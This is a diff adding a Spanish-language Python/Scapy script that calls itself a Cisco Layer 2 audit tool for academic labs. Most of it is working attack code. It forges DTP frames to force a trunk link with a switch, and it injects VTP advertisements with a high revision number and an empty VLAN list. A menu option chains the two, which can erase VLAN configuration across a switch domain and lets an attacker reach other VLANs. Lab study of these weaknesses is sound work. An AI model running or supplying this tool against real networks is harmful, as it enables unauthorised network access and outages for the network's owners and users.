@@ -1,0 +1,252 @@
+#!/usr/bin/env python3
+"""
+Módulo de Verificación de Seguridad en Capa 2 (DTP y VTP)
+Diseñado para auditorías controladas y entornos de laboratorio académico.
+"""
+
+import os
+import sys
+import time
+import struct
+from datetime import datetime
+from scapy.all import *
+
+# Deshabilitar interfaz gráfica interna de Scapy para evitar advertencias de Gdk
+os.environ["MPLBACKEND"] = "Agg"
+
+# ─────────────────────────────────────────────────────────────────
+# 1. GENERACIÓN DE PAQUETES (CONSTRUCCIÓN BINARIA MANUAL)
+# ─────────────────────────────────────────────────────────────────
+
+def construir_paquete_dtp(interfaz="eth0", dominio="clientes"):
+    """
+    Construye una trama DTP (Dynamic Trunking Protocol) en modo Desirable
+    utilizando codificación de bytes para evitar dependencias ausentes.
+    """
+    try:
+        mac_origen = get_if_hwaddr(interfaz)
+    except:
+        mac_origen = "00:11:22:33:44:55"
+
+    eth = Ether(dst="01:00:0c:cc:cc:cc", src=mac_origen)
+    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
+    snap = SNAP(OUI=0x00000c, code=0x2004)
+
+    # Carga útil DTP (Modo Desirable / Encap 802.1Q)
+    dominio_bytes = dominio.encode('utf-8')
+    dtp_payload = b'\x01'  # Versión DTP
+
+    # TLVs de DTP
+    dtp_payload += struct.pack('>HH', 0x0001, len(dominio_bytes) + 4) + dominio_bytes
+    dtp_payload += struct.pack('>HHB', 0x0002, 5, 0x03)  # Status: Desirable
+    dtp_payload += struct.pack('>HHB', 0x0003, 5, 0xa5)  # Type: 802.1Q
+
+    mac_bytes = bytes.fromhex(mac_origen.replace(':', ''))
+    dtp_payload += struct.pack('>HH', 0x0004, 10) + mac_bytes
+
+    return eth / llc / snap / Raw(load=dtp_payload)
+
+
+def construir_vtp_summary(dominio="clientes", revision=9999):
+    """Genera el payload estructurado para un anuncio VTP v2 Summary"""
+    dominio_bytes = dominio.encode('ascii')[:32].ljust(32, b'\x00')
+    now = datetime.now()
+    ts = f"{now.day:02d}{now.month:02d}{now.year}{now.hour:02d}{now.minute:02d}{now.second:02d}"
+    timestamp = ts.encode('ascii')[:12].ljust(12, b'\x00')
+
+    payload = struct.pack('B', 0x02)       # Versión VTP 2
+    payload += struct.pack('B', 0x01)      # Código: Summary Advertisement
+    payload += struct.pack('B', 0x01)      # Followers: 1
+    payload += struct.pack('B', len(dominio))
+    payload += dominio_bytes
+    payload += struct.pack('>I', revision) # Número de revisión (Big-Endian)
+    payload += bytes([23, 6, 1, 5])        # Identidad del Actualizador (IP ejemplo)
+    payload += timestamp
+    payload += bytes(16)                   # MD5 Hash vacío
+    return payload
+
+
+def construir_vtp_subset_vacio(dominio="clientes", revision=9999):
+    """Genera el payload para un VTP v2 Subset sin registros de VLANs"""
+    dominio_bytes = dominio.encode('ascii')[:32].ljust(32, b'\x00')
+
+    payload = struct.pack('B', 0x02)       # Versión VTP 2
+    payload += struct.pack('B', 0x02)      # Código: Subset Advertisement
+    payload += struct.pack('B', 0x01)      # Número de Secuencia
+    payload += struct.pack('B', len(dominio))
+    payload += dominio_bytes
+    payload += struct.pack('>I', revision)
+    return payload
+
+
+def encapsular_trama_vtp(payload: bytes):
+    """Aplica la encapsulación LLC/SNAP estándar de Cisco para VTP"""
+    eth = Ether(dst="01:00:0c:cc:cc:cc", src=RandMAC())
+    llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
+    snap = SNAP(OUI=0x00000c, code=0x2003)
+    return bytes(eth / llc / snap) + payload
+
+
+# ─────────────────────────────────────────────────────────────────
+# 2. FUNCIONES OPERATIVAS DE AUDITORÍA
+# ─────────────────────────────────────────────────────────────────
+
+def ejecutar_sniffing_vtp(interfaz="eth0", cantidad=10):
+    """Monitorea el medio en busca de anuncios VTP/DTP activos"""
+    print(f"[*] Analizando tráfico en {interfaz} (Límite: {cantidad} paquetes)...")
+
+    pkts = sniff(iface=interfaz, filter="ether dst 01:00:0c:cc:cc:cc", count=cantidad, timeout=20)
+    print(f"[+] Captura finalizada. Se procesaron {len(pkts)} tramas.")
+
+    for i, pkt in enumerate(pkts):
+        print(f"\n--- Trama #{i+1} ---")
+        if Raw in pkt:
+            raw_data = bytes(pkt[Raw].load)
+            if SNAP in pkt and pkt[SNAP].code == 0x2004:
+                print("[ Protocolo Detectado: DTP ]")
+            elif len(raw_data) >= 8:
+                version = raw_data[0]
+                tipo = raw_data[1]
+                try:
+                    revision = struct.unpack('>I', raw_data[4:8])[0]
+                except struct.error:
+                    revision = "Desconocida / Error de parsing"
+                print(f"[ Protocolo Detectado: VTP v{version} ]")
+                print(f" -> Tipo de Mensaje: {tipo}")
+                print(f" -> Número de Revisión Actual: {revision}")
+
+
+def negociar_enlace_trunk(interfaz="eth0", dominio="clientes", duracion=20):
+    """Envía ráfagas periódicas de tramas DTP para solicitar la creación de un trunk"""
+    print(f"[*] Iniciando negociación DTP en {interfaz} por {duracion} segundos...")
+    trama_dtp = construir_paquete_dtp(interfaz, dominio)
+
+    tiempo_inicio = time.time()
+    total_enviados = 0
+
+    try:
+        while time.time() - tiempo_inicio < duracion:
+            sendp(trama_dtp, iface=interfaz, verbose=False)
+            total_enviados += 1
+            print(f" -> Tramas DTP transmitidas: {total_enviados}", end='\r')
+            time.sleep(1)
+        print(f"\n[+] Proceso DTP concluido. Total tramas: {total_enviados}")
+    except KeyboardInterrupt:
+        print("\n[-] Transmisión DTP interrumpida.")
+
+
+def simular_inundacion_vtp(interfaz="eth0", dominio="clientes", revision=9999):
+    """Transmite actualizaciones VTP con un número de revisión elevado"""
+    print(f"[*] Preparando envío masivo VTP en {interfaz} (Revisión: {revision})...")
+
+    payload_sum = construir_vtp_summary(dominio, revision)
+    payload_sub = construir_vtp_subset_vacio(dominio, revision)
+
+    trama_sum = encapsular_trama_vtp(payload_sum)
+    trama_sub = encapsular_trama_vtp(payload_sub)
+
+    for r_num in range(5):
+        sendp(Raw(load=trama_sum), iface=interfaz, verbose=False)
+        time.sleep(0.1)
+        sendp(Raw(load=trama_sub), iface=interfaz, verbose=False)
+        print(f" -> Ciclo de sincronización #{r_num + 1} enviado.")
+        time.sleep(0.5)
+    print("[+] Inyección de tramas VTP finalizada.")
+
+
+def escanear_etiquetas_vlan(interfaz="eth0"):
+    """Identifica la presencia de tráfico etiquetado bajo el estándar 802.1Q"""
+    print(f"[*] Escaneando tramas con encapsulación 802.1Q en {interfaz}...")
+    capturas = sniff(iface=interfaz, filter="vlan", timeout=15, count=100)
+
+    vlans_registradas = {}
+    for pkt in capturas:
+        if Dot1Q in pkt:
+            vlan_id = pkt[Dot1Q].vlan
+            vlans_registradas[vlan_id] = vlans_registradas.get(vlan_id, 0) + 1
+
+    if vlans_registradas:
+        print("\n[+] Resumen de VLANs identificadas en el segmento:")
+        print("-----------------------------------------")
+        print("  VLAN ID   |   Muestras de Tráfico")
+        print("-----------------------------------------")
+        for vid in sorted(vlans_registradas):
+            print(f"    {vid:<8}│   {vlans_registradas[vid]:<12}")
+    else:
+        print("[-] No se detectaron identificadores VLAN en tránsito.")
+
+
+# ─────────────────────────────────────────────────────────────────
+# 3. INTERFAZ DE USUARIO (MENÚ CONSOLA)
+# ─────────────────────────────────────────────────────────────────
+
+def mostrar_menu():
+    print("\n" + "="*50)
+    print("      HERRAMIENTA DE AUDITORÍA DE CAPA 2 (CISCO)")
+    print("="*50)
+    print("  [1] Escucha Activa - Análisis de tráfico VTP/DTP")
+    print("  [2] Ejecución Simultánea (DTP Trunking + Inyección VTP)")
+    print("  [3] Simulación Única DTP (Fuerza de enlace Troncal)")
+    print("  [4] Simulación Única VTP (Requiere enlace Troncal previo)")
+    print("  [5] Descubrimiento Pasivo de VLANs (Dot1Q)")
+    print("  [6] Finalizar Aplicación")
+    return input("\nSeleccione una opción de diagnóstico: ").strip()
+
+
+if __name__ == "__main__":
+    # Validación estricta de privilegios de ejecución en el sistema
+    if os.geteuid() != 0:
+        print("[-] Error crítico: Se requieren privilegios de administrador (root).")
+        print(" -> Use: sudo python3 " + sys.argv[0])
+        sys.exit(1)
+
+    while True:
+        try:
+            opcion = mostrar_menu()
+
+            if opcion == "1":
+                iface = input("Especifique interfaz [eth0]: ").strip() or "eth0"
+                limite = input("Cantidad de paquetes [10]: ").strip() or "10"
+                ejecutar_sniffing_vtp(iface, int(limite))
+
+            elif opcion == "2":
+                iface = input("Especifique interfaz [eth0]: ").strip() or "eth0"
+                dom = input("Dominio VTP [clientes]: ").strip() or "clientes"
+                rev = input("Número de revisión [99999]: ").strip() or "99999"
+
+                # Fase 1: Establecer canal lógico
+                negociar_enlace_trunk(iface, dom, duracion=20)
+                print("[*] Pausa de estabilidad (5 segundos)...")
+                time.sleep(5)
+                # Fase 2: Inyección de datos de sincronización
+                simular_inundacion_vtp(iface, dom, int(rev))
+
+            elif opcion == "3":
+                iface = input("Especifique interfaz [eth0]: ").strip() or "eth0"
+                dom = input("Dominio VTP [clientes]: ").strip() or "clientes"
+                negociar_enlace_trunk(iface, dom, duracion=30)
+
+            elif opcion == "4":
+                iface = input("Especifique interfaz [eth0]: ").strip() or "eth0"
+                dom = input("Dominio VTP [clientes]: ").strip() or "clientes"
+                rev = input("Número de revisión [99999]: ").strip() or "99999"
+                simular_inundacion_vtp(iface, dom, int(rev))
+
+            elif opcion == "5":
+                iface = input("Especifique interfaz [eth0]: ").strip() or "eth0"
+                escanear_etiquetas_vlan(iface)
+
+            elif opcion == "6":
+                print("\n[*] Cerrando los descriptores de sockets. Finalizando programa.")
+                break
+            else:
+                print("[-] Opción no válida del menú.")
+
+            input("\nPresione ENTER para regresar al menú...")
+
+        except KeyboardInterrupt:
+            print("\n\n[-] Programa interrumpido de forma manual.")
+            break
+        except Exception as e:
+            print(f"\n[-] Ocurrió una anomalía durante la ejecución: {e}")
+            input("\nPresione ENTER para continuar...")
